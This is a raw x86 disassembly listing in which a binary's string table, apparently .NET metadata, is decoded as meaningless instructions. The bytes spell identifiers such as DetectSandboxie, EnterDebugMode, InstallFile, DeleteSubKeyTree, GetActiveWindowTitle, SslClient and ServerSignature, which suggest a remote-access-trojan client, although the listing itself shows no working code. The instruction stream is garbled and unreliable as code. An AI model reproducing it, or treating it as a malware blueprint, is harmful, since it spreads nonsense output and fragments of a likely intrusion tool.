  407c7e:	74 3e                	je     0x407cbe
  407c80:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c84:	61                   	popa
  407c85:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c88:	6e                   	outsb  %ds:(%esi),(%dx)
  407c89:	67 46                	addr16 inc %esi
  407c8b:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  407c92:	73 6c                	jae    0x407d00
  407c94:	43                   	inc    %ebx
  407c95:	6c                   	insb   (%dx),%es:(%edi)
  407c96:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407c9d:	5f                   	pop    %edi
  407c9e:	42                   	inc    %edx
  407c9f:	61                   	popa
  407ca0:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407ca3:	6e                   	outsb  %ds:(%esi),(%dx)
  407ca4:	67 46                	addr16 inc %esi
  407ca6:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  407cad:	63 70 43             	arpl   %esi,0x43(%eax)
  407cb0:	6c                   	insb   (%dx),%es:(%edi)
  407cb1:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407cb8:	5f                   	pop    %edi
  407cb9:	42                   	inc    %edx
  407cba:	61                   	popa
  407cbb:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407cbe:	6e                   	outsb  %ds:(%esi),(%dx)
  407cbf:	67 46                	addr16 inc %esi
  407cc1:	69 65 6c 64 00 49 6e 	imul   $0x6e490064,0x6c(%ebp),%esp
  407cc8:	6e                   	outsb  %ds:(%esi),(%dx)
  407cc9:	65 72 41             	gs jb  0x407d0d
  407ccc:	64 64 4d             	fs fs dec %ebp
  407ccf:	61                   	popa
  407cd0:	70 43                	jo     0x407d15
  407cd2:	68 69 6c 64 00       	push   $0x646c69
  407cd7:	49                   	dec    %ecx
  407cd8:	6e                   	outsb  %ds:(%esi),(%dx)
  407cd9:	6e                   	outsb  %ds:(%esi),(%dx)
  407cda:	65 72 41             	gs jb  0x407d1e
  407cdd:	64 64 41             	fs fs inc %ecx
  407ce0:	72 72                	jb     0x407d54
  407ce2:	61                   	popa
  407ce3:	79 43                	jns    0x407d28
  407ce5:	68 69 6c 64 00       	push   $0x646c69
  407cea:	68 57 6e 64 00       	push   $0x646e57
  407cef:	53                   	push   %ebx
  407cf0:	65 6e                	outsb  %gs:(%esi),(%dx)
  407cf2:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  407cf6:	70 65                	jo     0x407d5d
  407cf8:	6e                   	outsb  %ds:(%esi),(%dx)
  407cf9:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  407cfd:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  407d04:	61 
  407d05:	6c                   	insb   (%dx),%es:(%edi)
  407d06:	75 65                	jne    0x407d6d
  407d08:	4b                   	dec    %ebx
  407d09:	69 6e 64 00 52 65 70 	imul   $0x70655200,0x64(%esi),%ebp
  407d10:	6c                   	insb   (%dx),%es:(%edi)
  407d11:	61                   	popa
  407d12:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d15:	43                   	inc    %ebx
  407d16:	72 65                	jb     0x407d7d
  407d18:	61                   	popa
  407d19:	74 65                	je     0x407d80
  407d1b:	49                   	dec    %ecx
  407d1c:	6e                   	outsb  %ds:(%esi),(%dx)
  407d1d:	73 74                	jae    0x407d93
  407d1f:	61                   	popa
  407d20:	6e                   	outsb  %ds:(%esi),(%dx)
  407d21:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d24:	73 65                	jae    0x407d8b
  407d26:	74 5f                	je     0x407d87
  407d28:	4d                   	dec    %ebp
  407d29:	6f                   	outsl  %ds:(%esi),(%dx)
  407d2a:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  407d2f:	6c                   	insb   (%dx),%es:(%edi)
  407d30:	65 4d                	gs dec %ebp
  407d32:	6f                   	outsl  %ds:(%esi),(%dx)
  407d33:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  407d38:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  407d3f:	64 65 
  407d41:	00 45 6e             	add    %al,0x6e(%ebp)
  407d44:	74 65                	je     0x407dab
  407d46:	72 44                	jb     0x407d8c
  407d48:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407d4c:	4d                   	dec    %ebp
  407d4d:	6f                   	outsl  %ds:(%esi),(%dx)
  407d4e:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  407d53:	79 70                	jns    0x407dc5
  407d55:	74 6f                	je     0x407dc6
  407d57:	53                   	push   %ebx
  407d58:	74 72                	je     0x407dcc
  407d5a:	65 61                	gs popa
  407d5c:	6d                   	insl   (%dx),%es:(%edi)
  407d5d:	4d                   	dec    %ebp
  407d5e:	6f                   	outsl  %ds:(%esi),(%dx)
  407d5f:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  407d64:	6d                   	insl   (%dx),%es:(%edi)
  407d65:	70 72                	jo     0x407dd9
  407d67:	65 73 73             	gs jae 0x407ddd
  407d6a:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  407d71:	00 43 69             	add    %al,0x69(%ebx)
  407d74:	70 68                	jo     0x407dde
  407d76:	65 72 4d             	gs jb  0x407dc6
  407d79:	6f                   	outsl  %ds:(%esi),(%dx)
  407d7a:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  407d7f:	6c                   	insb   (%dx),%es:(%edi)
  407d80:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  407d85:	64 65 00 75 74       	fs add %dh,%gs:0x74(%ebp)
  407d8a:	66 38 45 6e          	data16 cmp %al,0x6e(%ebp)
  407d8e:	63 6f 64             	arpl   %ebp,0x64(%edi)
  407d91:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  407d96:	65 74 65             	gs je  0x407dfe
  407d99:	53                   	push   %ebx
  407d9a:	75 62                	jne    0x407dfe
  407d9c:	4b                   	dec    %ebx
  407d9d:	65 79 54             	gs jns 0x407df4
  407da0:	72 65                	jb     0x407e07
  407da2:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407da6:	74 5f                	je     0x407e07
  407da8:	4d                   	dec    %ebp
  407da9:	65 73 73             	gs jae 0x407e1f
  407dac:	61                   	popa
  407dad:	67 65 00 44 65       	add    %al,%gs:0x65(%si)
  407db2:	74 65                	je     0x407e19
  407db4:	63 74 53 61          	arpl   %esi,0x61(%ebx,%edx,2)
  407db8:	6e                   	outsb  %ds:(%esi),(%dx)
  407db9:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  407dbd:	69 65 00 49 6e 76 6f 	imul   $0x6f766e49,0x0(%ebp),%esp
  407dc4:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  407dc8:	45                   	inc    %ebp
  407dc9:	6e                   	outsb  %ds:(%esi),(%dx)
  407dca:	75 6d                	jne    0x407e39
  407dcc:	65 72 61             	gs jb  0x407e30
  407dcf:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  407dd3:	49                   	dec    %ecx
  407dd4:	44                   	inc    %esp
  407dd5:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  407ddc:	6c                   	insb   (%dx),%es:(%edi)
  407ddd:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  407de2:	6f                   	outsl  %ds:(%esi),(%dx)
  407de3:	75 62                	jne    0x407e47
  407de5:	6c                   	insb   (%dx),%es:(%edi)
  407de6:	65 00 53 77          	add    %dl,%gs:0x77(%ebx)
  407dea:	61                   	popa
  407deb:	70 44                	jo     0x407e31
  407ded:	6f                   	outsl  %ds:(%esi),(%dx)
  407dee:	75 62                	jne    0x407e52
  407df0:	6c                   	insb   (%dx),%es:(%edi)
  407df1:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407df5:	74 5f                	je     0x407e56
  407df7:	48                   	dec    %eax
  407df8:	61                   	popa
  407df9:	6e                   	outsb  %ds:(%esi),(%dx)
  407dfa:	64 6c                	fs insb (%dx),%es:(%edi)
  407dfc:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407e00:	6e                   	outsb  %ds:(%esi),(%dx)
  407e01:	74 69                	je     0x407e6c
  407e03:	6d                   	insl   (%dx),%es:(%edi)
  407e04:	65 46                	gs inc %esi
  407e06:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  407e0d:	64 6c                	fs insb (%dx),%es:(%edi)
  407e0f:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e13:	74 4d                	je     0x407e62
  407e15:	6f                   	outsl  %ds:(%esi),(%dx)
  407e16:	64 75 6c             	fs jne 0x407e85
  407e19:	65 48                	gs dec %eax
  407e1b:	61                   	popa
  407e1c:	6e                   	outsb  %ds:(%esi),(%dx)
  407e1d:	64 6c                	fs insb (%dx),%es:(%edi)
  407e1f:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407e23:	6e                   	outsb  %ds:(%esi),(%dx)
  407e24:	74 69                	je     0x407e8f
  407e26:	6d                   	insl   (%dx),%es:(%edi)
  407e27:	65 54                	gs push %esp
  407e29:	79 70                	jns    0x407e9b
  407e2b:	65 48                	gs dec %eax
  407e2d:	61                   	popa
  407e2e:	6e                   	outsb  %ds:(%esi),(%dx)
  407e2f:	64 6c                	fs insb (%dx),%es:(%edi)
  407e31:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e35:	74 54                	je     0x407e8b
  407e37:	79 70                	jns    0x407ea9
  407e39:	65 46                	gs inc %esi
  407e3b:	72 6f                	jb     0x407eac
  407e3d:	6d                   	insl   (%dx),%es:(%edi)
  407e3e:	48                   	dec    %eax
  407e3f:	61                   	popa
  407e40:	6e                   	outsb  %ds:(%esi),(%dx)
  407e41:	64 6c                	fs insb (%dx),%es:(%edi)
  407e43:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  407e47:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  407e4e:	65 
  407e4f:	00 57 72             	add    %dl,0x72(%edi)
  407e52:	69 74 65 53 69 6e 67 	imul   $0x6c676e69,0x53(%ebp,%eiz,2),%esi
  407e59:	6c 
  407e5a:	65 00 54 6f 53       	add    %dl,%gs:0x53(%edi,%ebp,2)
  407e5f:	69 6e 67 6c 65 00 53 	imul   $0x5300656c,0x67(%esi),%ebp
  407e66:	65 74 41             	gs je  0x407eaa
  407e69:	73 53                	jae    0x407ebe
  407e6b:	69 6e 67 6c 65 00 49 	imul   $0x4900656c,0x67(%esi),%ebp
  407e72:	6e                   	outsb  %ds:(%esi),(%dx)
  407e73:	73 74                	jae    0x407ee9
  407e75:	61                   	popa
  407e76:	6c                   	insb   (%dx),%es:(%edi)
  407e77:	6c                   	insb   (%dx),%es:(%edi)
  407e78:	46                   	inc    %esi
  407e79:	69 6c 65 00 44 65 63 	imul   $0x6f636544,0x0(%ebp,%eiz,2),%ebp
  407e80:	6f 
  407e81:	64 65 46             	fs gs inc %esi
  407e84:	72 6f                	jb     0x407ef5
  407e86:	6d                   	insl   (%dx),%es:(%edi)
  407e87:	46                   	inc    %esi
  407e88:	69 6c 65 00 53 61 76 	imul   $0x65766153,0x0(%ebp,%eiz,2),%ebp
  407e8f:	65 
  407e90:	42                   	inc    %edx
  407e91:	79 74                	jns    0x407f07
  407e93:	65 73 54             	gs jae 0x407eea
  407e96:	6f                   	outsl  %ds:(%esi),(%dx)
  407e97:	46                   	inc    %esi
  407e98:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  407e9f:	6e 
  407ea0:	52                   	push   %edx
  407ea1:	6f                   	outsl  %ds:(%esi),(%dx)
  407ea2:	6c                   	insb   (%dx),%es:(%edi)
  407ea3:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  407ea7:	6e                   	outsb  %ds:(%esi),(%dx)
  407ea8:	64 6f                	outsl  %fs:(%esi),(%dx)
  407eaa:	77 73                	ja     0x407f1f
  407eac:	42                   	inc    %edx
  407ead:	75 69                	jne    0x407f18
  407eaf:	6c                   	insb   (%dx),%es:(%edi)
  407eb0:	74 49                	je     0x407efb
  407eb2:	6e                   	outsb  %ds:(%esi),(%dx)
  407eb3:	52                   	push   %edx
  407eb4:	6f                   	outsl  %ds:(%esi),(%dx)
  407eb5:	6c                   	insb   (%dx),%es:(%edi)
  407eb6:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407eba:	74 41                	je     0x407efd
  407ebc:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407ec0:	65 57                	gs push %edi
  407ec2:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  407ec9:	74 6c                	je     0x407f37
  407ecb:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407ecf:	74 5f                	je     0x407f30
  407ed1:	4d                   	dec    %ebp
  407ed2:	61                   	popa
  407ed3:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  407eda:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ede:	6f                   	outsl  %ds:(%esi),(%dx)
  407edf:	63 65 73             	arpl   %esp,0x73(%ebp)
  407ee2:	73 4d                	jae    0x407f31
  407ee4:	6f                   	outsl  %ds:(%esi),(%dx)
  407ee5:	64 75 6c             	fs jne 0x407f54
  407ee8:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407eec:	74 5f                	je     0x407f4d
  407eee:	57                   	push   %edi
  407eef:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407ef6:	79 6c                	jns    0x407f64
  407ef8:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407efc:	6f                   	outsl  %ds:(%esi),(%dx)
  407efd:	63 65 73             	arpl   %esp,0x73(%ebp)
  407f00:	73 57                	jae    0x407f59
  407f02:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407f09:	79 6c                	jns    0x407f77
  407f0b:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f0f:	74 5f                	je     0x407f70
  407f11:	4e                   	dec    %esi
  407f12:	61                   	popa
  407f13:	6d                   	insl   (%dx),%es:(%edi)
  407f14:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f18:	74 5f                	je     0x407f79
  407f1a:	46                   	inc    %esi
  407f1b:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f22:	00 
  407f23:	73 65                	jae    0x407f8a
  407f25:	74 5f                	je     0x407f86
  407f27:	46                   	inc    %esi
  407f28:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f2f:	00 
  407f30:	47                   	inc    %edi
  407f31:	65 74 54             	gs je  0x407f88
  407f34:	65 6d                	gs insl (%dx),%es:(%edi)
  407f36:	70 46                	jo     0x407f7e
  407f38:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f3f:	00 
  407f40:	47                   	inc    %edi
  407f41:	65 74 46             	gs je  0x407f8a
  407f44:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f4b:	00 
  407f4c:	66 69 6c 65 4e 61 6d 	imul   $0x6d61,0x4e(%ebp,%eiz,2),%bp
  407f53:	65 00 6c 70 4d       	add    %ch,%gs:0x4d(%eax,%esi,2)
  407f58:	6f                   	outsl  %ds:(%esi),(%dx)
  407f59:	64 75 6c             	fs jne 0x407fc8
  407f5c:	65 4e                	gs dec %esi
  407f5e:	61                   	popa
  407f5f:	6d                   	insl   (%dx),%es:(%edi)
  407f60:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f64:	74 5f                	je     0x407fc5
  407f66:	4d                   	dec    %ebp
  407f67:	61                   	popa
  407f68:	63 68 69             	arpl   %ebp,0x69(%eax)
  407f6b:	6e                   	outsb  %ds:(%esi),(%dx)
  407f6c:	65 4e                	gs dec %esi
  407f6e:	61                   	popa
  407f6f:	6d                   	insl   (%dx),%es:(%edi)
  407f70:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f74:	74 5f                	je     0x407fd5
  407f76:	4f                   	dec    %edi
  407f77:	53                   	push   %ebx
  407f78:	46                   	inc    %esi
  407f79:	75 6c                	jne    0x407fe7
  407f7b:	6c                   	insb   (%dx),%es:(%edi)
  407f7c:	4e                   	dec    %esi
  407f7d:	61                   	popa
  407f7e:	6d                   	insl   (%dx),%es:(%edi)
  407f7f:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f83:	74 5f                	je     0x407fe4
  407f85:	46                   	inc    %esi
  407f86:	75 6c                	jne    0x407ff4
  407f88:	6c                   	insb   (%dx),%es:(%edi)
  407f89:	4e                   	dec    %esi
  407f8a:	61                   	popa
  407f8b:	6d                   	insl   (%dx),%es:(%edi)
  407f8c:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  407f90:	56                   	push   %esi
  407f91:	61                   	popa
  407f92:	6c                   	insb   (%dx),%es:(%edi)
  407f93:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  407f9a:	6e 
  407f9b:	4e                   	dec    %esi
  407f9c:	61                   	popa
  407f9d:	6d                   	insl   (%dx),%es:(%edi)
  407f9e:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407fa2:	74 5f                	je     0x408003
  407fa4:	55                   	push   %ebp
  407fa5:	73 65                	jae    0x40800c
  407fa7:	72 4e                	jb     0x407ff7
  407fa9:	61                   	popa
  407faa:	6d                   	insl   (%dx),%es:(%edi)
  407fab:	65 00 6c 6f 77       	add    %ch,%gs:0x77(%edi,%ebp,2)
  407fb0:	65 72 4e             	gs jb  0x408001
  407fb3:	61                   	popa
  407fb4:	6d                   	insl   (%dx),%es:(%edi)
  407fb5:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  407fb9:	74 4e                	je     0x408009
  407fbb:	61                   	popa
  407fbc:	6d                   	insl   (%dx),%es:(%edi)
  407fbd:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  407fc1:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  407fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  407fc6:	73 74                	jae    0x40803c
  407fc8:	4e                   	dec    %esi
  407fc9:	61                   	popa
  407fca:	6d                   	insl   (%dx),%es:(%edi)
  407fcb:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  407fcf:	6d                   	insl   (%dx),%es:(%edi)
  407fd0:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  407fd5:	65 54                	gs push %esp
  407fd7:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  407fde:	5f                   	pop    %edi
  407fdf:	4c                   	dec    %esp
  407fe0:	61                   	popa
  407fe1:	73 74                	jae    0x408057
  407fe3:	57                   	push   %edi
  407fe4:	72 69                	jb     0x40804f
  407fe6:	74 65                	je     0x40804d
  407fe8:	54                   	push   %esp
  407fe9:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  407ff0:	6e                   	outsb  %ds:(%esi),(%dx)
  407ff1:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  407ff8:	54                   	push   %esp
  407ff9:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  408000:	74 65                	je     0x408067
  408002:	4c                   	dec    %esp
  408003:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  40800a:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  40800d:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  408011:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  408018:	6d                   	insl   (%dx),%es:(%edi)
  408019:	65 54                	gs push %esp
  40801b:	79 70                	jns    0x40808d
  40801d:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408021:	74 5f                	je     0x408082
  408023:	56                   	push   %esi
  408024:	61                   	popa
  408025:	6c                   	insb   (%dx),%es:(%edi)
  408026:	75 65                	jne    0x40808d
  408028:	54                   	push   %esp
  408029:	79 70                	jns    0x40809b
  40802b:	65 00 76 61          	add    %dh,%gs:0x61(%esi)
  40802f:	6c                   	insb   (%dx),%es:(%edi)
  408030:	75 65                	jne    0x408097
  408032:	54                   	push   %esp
  408033:	79 70                	jns    0x4080a5
  408035:	65 00 4d 73          	add    %cl,%gs:0x73(%ebp)
  408039:	67 50                	addr16 push %eax
  40803b:	61                   	popa
  40803c:	63 6b 54             	arpl   %ebp,0x54(%ebx)
  40803f:	79 70                	jns    0x4080b1
  408041:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  408045:	6f                   	outsl  %ds:(%esi),(%dx)
  408046:	74 6f                	je     0x4080b7
  408048:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  40804b:	54                   	push   %esp
  40804c:	79 70                	jns    0x4080be
  40804e:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408052:	74 54                	je     0x4080a8
  408054:	79 70                	jns    0x4080c6
  408056:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  40805a:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40805d:	74 54                	je     0x4080b3
  40805f:	79 70                	jns    0x4080d1
  408061:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  408065:	6c                   	insb   (%dx),%es:(%edi)
  408066:	65 53                	gs push %ebx
  408068:	68 61 72 65 00       	push   $0x657261
  40806d:	53                   	push   %ebx
  40806e:	79 73                	jns    0x4080e3
  408070:	74 65                	je     0x4080d7
  408072:	6d                   	insl   (%dx),%es:(%edi)
  408073:	2e 43                	cs inc %ebx
  408075:	6f                   	outsl  %ds:(%esi),(%dx)
  408076:	72 65                	jb     0x4080dd
  408078:	00 53 65             	add    %dl,0x65(%ebx)
  40807b:	72 76                	jb     0x4080f3
  40807d:	65 72 73             	gs jb  0x4080f3
  408080:	69 67 6e 61 74 75 72 	imul   $0x72757461,0x6e(%edi),%esp
  408087:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  40808b:	6f                   	outsl  %ds:(%esi),(%dx)
  40808c:	73 65                	jae    0x4080f3
  40808e:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  408092:	70 6f                	jo     0x408103
  408094:	73 65                	jae    0x4080fb
  408096:	00 50 61             	add    %dl,0x61(%eax)
  408099:	72 73                	jb     0x40810e
  40809b:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  40809f:	72 52                	jb     0x4080f3
  4080a1:	65 76 65             	gs jbe 0x408109
  4080a4:	72 73                	jb     0x408119
  4080a6:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  4080aa:	30 39                	xor    %bh,(%ecx)
  4080ac:	43                   	inc    %ebx
  4080ad:	65 72 74             	gs jb  0x408124
  4080b0:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080b7:	00 56 61             	add    %dl,0x61(%esi)
  4080ba:	6c                   	insb   (%dx),%es:(%edi)
  4080bb:	69 64 61 74 65 53 65 	imul   $0x72655365,0x74(%ecx,%eiz,2),%esp
  4080c2:	72 
  4080c3:	76 65                	jbe    0x40812a
  4080c5:	72 43                	jb     0x40810a
  4080c7:	65 72 74             	gs jb  0x40813e
  4080ca:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080d1:	00 63 65             	add    %ah,0x65(%ebx)
  4080d4:	72 74                	jb     0x40814a
  4080d6:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080dd:	00 43 72             	add    %al,0x72(%ebx)
  4080e0:	65 61                	gs popa
  4080e2:	74 65                	je     0x408149
  4080e4:	00 53 65             	add    %dl,0x65(%ebx)
  4080e7:	74 54                	je     0x40813d
  4080e9:	68 72 65 61 64       	push   $0x64616572
  4080ee:	45                   	inc    %ebp
  4080ef:	78 65                	js     0x408156
  4080f1:	63 75 74             	arpl   %esi,0x74(%ebp)
  4080f4:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  4080fb:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  408100:	65 74 65             	gs je  0x408168
  408103:	00 43 61             	add    %al,0x61(%ebx)
  408106:	6c                   	insb   (%dx),%es:(%edi)
  408107:	6c                   	insb   (%dx),%es:(%edi)
  408108:	53                   	push   %ebx
  408109:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  408110:	74 
  408111:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408115:	6d                   	insl   (%dx),%es:(%edi)
  408116:	70 69                	jo     0x408181
  408118:	6c                   	insb   (%dx),%es:(%edi)
  408119:	65 72 47             	gs jb  0x408163
  40811c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40811e:	65 72 61             	gs jb  0x408182
  408121:	74 65                	je     0x408188
  408123:	64 41                	fs inc %ecx
  408125:	74 74                	je     0x40819b
  408127:	72 69                	jb     0x408192
  408129:	62 75 74             	bound  %esi,0x74(%ebp)
  40812c:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  408131:	75 67                	jne    0x40819a
  408133:	67 61                	addr16 popa
  408135:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  408139:	74 74                	je     0x4081af
  40813b:	72 69                	jb     0x4081a6
  40813d:	62 75 74             	bound  %esi,0x74(%ebp)
  408140:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408144:	6d                   	insl   (%dx),%es:(%edi)
  408145:	56                   	push   %esi
  408146:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  40814d:	74 74                	je     0x4081c3
  40814f:	72 69                	jb     0x4081ba
  408151:	62 75 74             	bound  %esi,0x74(%ebp)
  408154:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408158:	73 65                	jae    0x4081bf
  40815a:	6d                   	insl   (%dx),%es:(%edi)
  40815b:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40815f:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  408166:	72 
  408167:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  40816e:	73 73                	jae    0x4081e3
  408170:	65 6d                	gs insl (%dx),%es:(%edi)
  408172:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408176:	72 61                	jb     0x4081d9
  408178:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  40817b:	61                   	popa
  40817c:	72 6b                	jb     0x4081e9
  40817e:	41                   	inc    %ecx
  40817f:	74 74                	je     0x4081f5
  408181:	72 69                	jb     0x4081ec
  408183:	62 75 74             	bound  %esi,0x74(%ebp)
  408186:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  40818b:	67 65 74 46          	addr16 gs je 0x4081d5
  40818f:	72 61                	jb     0x4081f2
  408191:	6d                   	insl   (%dx),%es:(%edi)
  408192:	65 77 6f             	gs ja  0x408204
  408195:	72 6b                	jb     0x408202
  408197:	41                   	inc    %ecx
  408198:	74 74                	je     0x40820e
  40819a:	72 69                	jb     0x408205
  40819c:	62 75 74             	bound  %esi,0x74(%ebp)
  40819f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081a3:	73 65                	jae    0x40820a
  4081a5:	6d                   	insl   (%dx),%es:(%edi)
  4081a6:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4081aa:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4081b1:	69 
  4081b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4081b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4081b4:	41                   	inc    %ecx
  4081b5:	74 74                	je     0x40822b
  4081b7:	72 69                	jb     0x408222
  4081b9:	62 75 74             	bound  %esi,0x74(%ebp)
  4081bc:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081c0:	73 65                	jae    0x408227
  4081c2:	6d                   	insl   (%dx),%es:(%edi)
  4081c3:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4081c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4081c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4081c9:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4081cf:	74 69                	je     0x40823a
  4081d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4081d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4081d3:	41                   	inc    %ecx
  4081d4:	74 74                	je     0x40824a
  4081d6:	72 69                	jb     0x408241
  4081d8:	62 75 74             	bound  %esi,0x74(%ebp)
  4081db:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081df:	73 65                	jae    0x408246
  4081e1:	6d                   	insl   (%dx),%es:(%edi)
  4081e2:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4081e6:	65 73 63             	gs jae 0x40824c
  4081e9:	72 69                	jb     0x408254
  4081eb:	70 74                	jo     0x408261
  4081ed:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
